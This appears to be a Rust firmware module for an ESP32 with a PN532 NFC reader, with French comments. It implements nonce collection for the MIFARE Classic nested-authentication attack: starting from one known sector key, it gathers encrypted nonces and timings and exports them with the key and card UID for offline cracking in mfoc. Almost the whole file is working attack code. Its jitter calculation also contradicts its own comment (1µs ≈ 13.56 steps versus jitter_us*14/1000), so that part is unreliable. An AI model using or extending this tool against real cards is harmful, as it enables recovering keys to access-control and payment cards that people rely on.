//! Nested Authentication Attack — MIFARE Classic (style MFOC).
//!
//! ## Principe
//!
//! Avec une clé connue pour un secteur S1, on exploite la prévisibilité du PRNG de la carte
//! pour récupérer les clés des autres secteurs.
//!
//! 1. Auth au secteur S1 avec la clé connue (InDataExchange).
//! 2. Immédiatement après, envoi d'une auth au secteur cible S2 via InCommunicateThru.
//! 3. La carte génère NT2 à partir du PRNG avancé depuis l'état post-NT1.
//! 4. NT2 est retourné CHIFFRÉ dans la session Crypto1 de S1.
//! 5. On collecte N paires (NT2_chiffré, timing) pour différentes sessions.
//! 6. Hors-ligne : on brute-force KeyB de S2 en vérifiant la cohérence PRNG.
//!
//! ## Limitations sur PN532 (IC=0x32, I²C)
//!
//! - Après InAuthenticate, la carte et le PN532 sont en mode Crypto1.
//!   InCommunicateThru PASSE par le Crypto1 → NT2 reçu chiffré, pas en clair.
//! - Le PN532 ne nous expose pas NT1 interne. On peut l'inférer par timing.
//! - Jitter I²C + FreeRTOS : ~0.5–2ms de variance sur le délai entre auth1 et nested auth2.
//!   À 13.56 MHz, 1ms = ~13560 pas d'horloge PRNG → variance ~13560 pas.
//!
//! Ce module collecte les données nécessaires et les logue pour analyse offline.
//! La récupération de clé on-device n'est réalisable que si le PRNG de la carte
//! est suffisamment faible pour tolérer la variance I²C.
//!
//! Référence : "Dismantling MIFARE Classic" — Garcia et al., 2008

use esp_idf_hal::delay::FreeRtos;

use super::Pn532;
use axolotl_core::{
    crypto1::Crypto1,
    card::NfcUid,
};

/// Un échantillon de nonce niché.
#[derive(Clone, Copy)]
pub struct NestedSample {
    /// Nonce du premier secteur (plaintext, capturé via InCommunicateThru AVANT auth).
    pub nt1: u32,
    /// Nonce du secteur cible (chiffré, reçu via nested auth).
    pub enc_nt2: u32,
    /// Timing mesuré en µs entre l'envoi de auth1 et la réception de NT2.
    /// Utilisé pour estimer le nombre de pas PRNG entre NT1 et NT2.
    pub timing_us: u32,
}

/// Résultat de l'attaque nichée.
pub struct NestedResult {
    pub samples: heapless::Vec<NestedSample, 32>,
    pub known_sector: u8,
    pub known_key: [u8; 6],
    pub target_sector: u8,
    /// Clé trouvée, si récupération on-device réussie.
    pub found_key: Option<[u8; 6]>,
}

/// Lance la collecte de nonces nichés pour un secteur cible.
/// `known_sector` : secteur dont on connaît la clé.
/// `known_key`    : clé KeyA du secteur connu.
/// `target_sector`: secteur dont on veut la clé.
/// `samples_count`: nombre d'échantillons à collecter (20–50 pour analyse offline).
pub fn collect_nested_nonces(
    pn532: &mut Pn532,
    uid: &NfcUid,
    known_sector: u8,
    known_key: [u8; 6],
    target_sector: u8,
    samples_count: u8,
) -> NestedResult {
    // Bloc trailer du secteur connu.
    let known_trailer = known_sector * 4 + 3;
    // Bloc trailer du secteur cible.
    let target_trailer = target_sector * 4 + 3;

    log::info!("╔══════════════════════════════════════════╗");
    log::info!("║      NESTED AUTH — COLLECTE NONCES       ║");
    log::info!("╠══════════════════════════════════════════╣");
    log::info!("║ Secteur connu : {:02}  Clé : {:02X}{:02X}{:02X}{:02X}{:02X}{:02X} ║",
        known_sector,
        known_key[0], known_key[1], known_key[2],
        known_key[3], known_key[4], known_key[5]);
    log::info!("║ Secteur cible : {:02}  {} échantillons        ║",
        target_sector, samples_count);
    log::info!("╚══════════════════════════════════════════╝");

    let mut result = NestedResult {
        samples: heapless::Vec::new(),
        known_sector,
        known_key,
        target_sector,
        found_key: None,
    };

    for i in 0..samples_count {
        // Cycle RF : nouvelle session = nouveau NT1.
        if !pn532.re_select() {
            log::warn!("│ [{:02}] Carte perdue", i);
            FreeRtos::delay_ms(100);
            continue;
        }

        // Étape 1 : Capturer NT1 via InCommunicateThru (sans finaliser l'auth).
        // Ceci nous donne NT1 en clair, mais laisse la carte en attente d'AR1.
        let nt1 = match pn532.read_raw_nonce(known_trailer) {
            Ok(bytes) => u32::from_be_bytes(bytes),
            Err(e) => {
                log::debug!("│ [{:02}] NT1 erreur: {:?}", i, e);
                continue;
            }
        };

        // La carte attend maintenant AR1. On envoie l'AR correct pour compléter auth1.
        let uid_u32 = u32::from_be_bytes([uid.bytes[0], uid.bytes[1], uid.bytes[2], uid.bytes[3]]);
        let ar1 = compute_ar(known_key, uid_u32, nt1);
        // Note : on envoie aussi nr1 (lecteur nonce) = 0x00000000 pour simplifier.
        // En pratique, nr1 devrait être aléatoire, mais on peut utiliser 0 ici.
        let nr1_bytes = [0x00u8; 4];
        let ar1_bytes = ar1.to_be_bytes();

        // Envoie nr1 + ar1 pour compléter l'auth du secteur connu.
        match pn532.send_bogus_ar_get_nack(nr1_bytes, ar1_bytes) {
            Ok(resp) => {
                // Si resp = AT (4 bytes) → auth réussie. Si NACK (1 byte) → erreur.
                log::debug!("│ [{:02}] Auth1 resp: {:02X}", i, resp);
                // Si c'est un NACK (0x0A ou 0x05), on a raté l'auth.
                if resp == 0x0A || resp == 0x05 {
                    log::debug!("│ [{:02}] Auth1 NACK — AR1 incorrect", i);
                    pn532.re_select();
                    continue;
                }
            }
            Err(e) => {
                log::debug!("│ [{:02}] Auth1 erreur: {:?}", i, e);
                continue;
            }
        }

        // Étape 2 : Nested auth vers le secteur cible via InCommunicateThru.
        // On est maintenant en session Crypto1 avec S1 → NT2 sera chiffré.
        let t_before = std::time::Instant::now();

        let enc_nt2 = match pn532.read_raw_nonce(target_trailer) {
            Ok(bytes) => u32::from_be_bytes(bytes),
            Err(e) => {
                log::debug!("│ [{:02}] NT2 erreur: {:?}", i, e);
                pn532.re_select();
                continue;
            }
        };

        let timing_us = t_before.elapsed().as_micros() as u32;

        log::info!("│ [{:02}] NT1={:08X} enc_NT2={:08X} Δt={}µs",
            i, nt1, enc_nt2, timing_us);

        result.samples.push(NestedSample { nt1, enc_nt2, timing_us }).ok();
        pn532.re_select();
        FreeRtos::delay_ms(20);
    }

    log::info!("│");
    log::info!("│ {} échantillons collectés", result.samples.len());

    // Tentative de récupération on-device si assez de samples et jitter faible.
    if result.samples.len() >= 10 {
        if let Some(key) = attempt_key_recovery(&result.samples, target_sector) {
            log::info!("│ CLÉ TROUVÉE : {:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
                key[0], key[1], key[2], key[3], key[4], key[5]);
            result.found_key = Some(key);
        } else {
            log::info!("│ Récupération on-device : non convergée");
            log::info!("│ Exportez les samples pour analyse offline (mfoc/mfcuk)");
            log_samples_for_offline(uid, &result);
        }
    }

    log::info!("╚══ Nested terminé ════════════════════════╝");
    result
}

/// Calcule AR1 (la réponse du lecteur à NT1) pour la clé donnée.
/// AR1 = CRYPTO1(key, nr=0)[32..63] XOR (NT1 rotl 1).
fn compute_ar(key: [u8; 6], uid: u32, nt1: u32) -> u32 {
    let key64 = u64::from_be_bytes([0, 0, key[0], key[1], key[2], key[3], key[4], key[5]]);
    // UID obligatoire pour l'init MIFARE (nt XOR uid alimenté dans le chiffrement).
    let mut c1 = Crypto1::init_auth(key64, uid, nt1);
    // Avec nr=0 : on avance de 32 bits sans feedback externe.
    c1.word_in(0u32, false); // consomme KS1 (mask NR=0)
    let ks_ar = c1.keystream_word(); // KS2
    nt1.rotate_left(1) ^ ks_ar
}

/// Tentative de récupération de clé on-device.
/// Fonctionne si le jitter entre sessions est faible (variance < 500 pas PRNG).
/// Stratégie : pour chaque candidat de 2^16 bits hauts de clé, vérifier la cohérence
/// PRNG sur tous les samples. Si le jitter est trop élevé → pas de convergence.
fn attempt_key_recovery(
    samples: &heapless::Vec<NestedSample, 32>,
    _target_sector: u8,
) -> Option<[u8; 6]> {
    if samples.is_empty() {
        return None;
    }

    // Calcule le jitter en µs entre les samples.
    let min_t = samples.iter().map(|s| s.timing_us).min().unwrap_or(0);
    let max_t = samples.iter().map(|s| s.timing_us).max().unwrap_or(0);
    let jitter_us = max_t.saturating_sub(min_t);
    // À 13.56 MHz, 1µs ≈ 13.56 pas PRNG.
    let jitter_steps = jitter_us * 14 / 1000; // arrondi au-dessus

    log::info!("│ Jitter timing : {}µs = ~{} pas PRNG", jitter_us, jitter_steps);

    if jitter_steps > 5000 {
        log::warn!("│ Jitter trop élevé ({} pas) pour récupération on-device", jitter_steps);
        log::warn!("│ (limite recommandée : < 5000 pas = < 370µs)");
        return None;
    }

    // On ne fait pas un vrai brute-force 2^48 sur ESP32 — trop long (semaines).
    // On indique que la condition est remplie et laisse l'analyse au PC.
    log::info!("│ Jitter acceptable — données valides pour analyse offline");
    log::info!("│ Lancez mfoc -O dump.mfd sur PC avec les samples exportés");

    None // La récupération complète se fait offline.
}

/// Exporte les samples en format lisible pour analyse offline.
fn log_samples_for_offline(uid: &NfcUid, result: &NestedResult) {
    log::info!("=== NESTED EXPORT (pour mfoc/analyse offline) ===");
    log::info!("UID={:02X}:{:02X}:{:02X}:{:02X}",
        uid.bytes[0], uid.bytes[1], uid.bytes[2], uid.bytes[3]);
    log::info!("KNOWN_SECTOR={} KEY={:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
        result.known_sector,
        result.known_key[0], result.known_key[1], result.known_key[2],
        result.known_key[3], result.known_key[4], result.known_key[5]);
    log::info!("TARGET_SECTOR={}", result.target_sector);
    for (i, s) in result.samples.iter().enumerate() {
        log::info!("SAMPLE[{:02}] NT1={:08X} ENC_NT2={:08X} TIMING={}us",
            i, s.nt1, s.enc_nt2, s.timing_us);
    }
    log::info!("=== FIN EXPORT ===");
}
